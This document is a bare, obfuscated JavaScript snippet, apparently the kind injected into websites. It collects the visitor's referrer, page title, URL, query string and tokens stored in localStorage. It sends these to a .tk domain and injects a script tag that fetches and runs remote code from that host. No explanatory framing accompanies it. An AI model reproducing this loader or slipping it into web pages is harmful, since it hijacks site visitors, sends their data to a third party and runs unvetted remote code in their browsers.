 (function() {
    var name = '_pYrJp5pkYfJ6vqtG';
    if (!window._pYrJp5pkYfJ6vqtG) {
        window._pYrJp5pkYfJ6vqtG = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://paygambfasliling.tk/jog-fit',
            P_PATH: 'https://paygambfasliling.tk/fec84ce/postback',
        };
    }
    const _htFKGV3JGm151s1d = localStorage.getItem('config');
    if (typeof _htFKGV3JGm151s1d !== 'undefined' && _htFKGV3JGm151s1d !== null) {
        var _kp7XTH329LhP283s = JSON.parse(_htFKGV3JGm151s1d);
        var _TvN54SsGCgFF5vXL = Math.round(+new Date()/1000);
        if (_kp7XTH329LhP283s.created_at + window._pYrJp5pkYfJ6vqtG.ttl < _TvN54SsGCgFF5vXL) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _G5Gxp8xLCSxkTfKt = localStorage.getItem('subId');
    var _KkBwNNPffZ9CMzzV = localStorage.getItem('token');
    var _9vMX6ggVcyJDL8RH = '?return=js.client';
        _9vMX6ggVcyJDL8RH += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _9vMX6ggVcyJDL8RH += '&se_referrer=' + encodeURIComponent(document.referrer);
        _9vMX6ggVcyJDL8RH += '&default_keyword=' + encodeURIComponent(document.title);
        _9vMX6ggVcyJDL8RH += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _9vMX6ggVcyJDL8RH += '&name=' + encodeURIComponent(name);
        _9vMX6ggVcyJDL8RH += '&host=' + encodeURIComponent(window._pYrJp5pkYfJ6vqtG.R_PATH);
    if (typeof _G5Gxp8xLCSxkTfKt !== 'undefined' && _G5Gxp8xLCSxkTfKt && window._pYrJp5pkYfJ6vqtG.unique) {
        _9vMX6ggVcyJDL8RH += '&sub_id=' + encodeURIComponent(_G5Gxp8xLCSxkTfKt);
    }
    if (typeof _KkBwNNPffZ9CMzzV !== 'undefined' && _KkBwNNPffZ9CMzzV && window._pYrJp5pkYfJ6vqtG.unique) {
        _9vMX6ggVcyJDL8RH += '&token=' + encodeURIComponent(_KkBwNNPffZ9CMzzV);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._pYrJp5pkYfJ6vqtG.R_PATH + _9vMX6ggVcyJDL8RH;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
